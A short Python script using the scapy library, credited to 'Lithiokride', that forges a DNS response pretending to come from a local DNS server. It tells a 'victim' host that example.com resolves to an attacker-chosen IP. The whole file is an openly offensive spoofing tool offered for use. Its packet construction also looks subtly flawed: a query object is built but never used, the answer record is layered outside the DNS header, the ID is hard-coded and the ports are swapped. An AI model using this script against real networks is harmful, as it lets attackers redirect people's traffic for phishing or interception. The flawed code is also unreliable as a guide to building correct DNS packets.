from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
# Written by Lithiokride

# Parameters
target_ip = "192.168.1.100"  # Target IP address of the victim
dns_server_ip = "192.168.1.1"  # IP address of the DNS server
spoofed_domain = "example.com"  # Domain to spoof
spoofed_ip = "192.168.1.200"  # Fake IP address to return

# Create the DNS query packet
dns_query = DNSQR(qname=spoofed_domain, qtype="A", qclass="IN")

# Create the DNS response packet
dns_response = DNS(
    id=12345,  # Transaction ID
    qr=1,      # Set the QR bit to indicate a response
    opcode=0,  # Standard query
    aa=1,      # Authoritative answer
    rd=0,      # Recursion desired
    ra=0,      # Recursion available
    rcode=0,   # No error
    qdcount=1, # One question
    ancount=1, # One answer
    nscount=0, # No authority records
    arcount=0   # No additional records
)

# Create the answer record
answer = DNSRR(rrname=spoofed_domain, rdata=spoofed_ip, ttl=3600)

# Create the full packet
packet = IP(dst=target_ip, src=dns_server_ip)/UDP(dport=53, sport=12345)/dns_response/answer

# Send the packet
send(packet, verbose=0)

print(f"Sent DNS spoofing packet: {spoofed_domain} -> {spoofed_ip}")
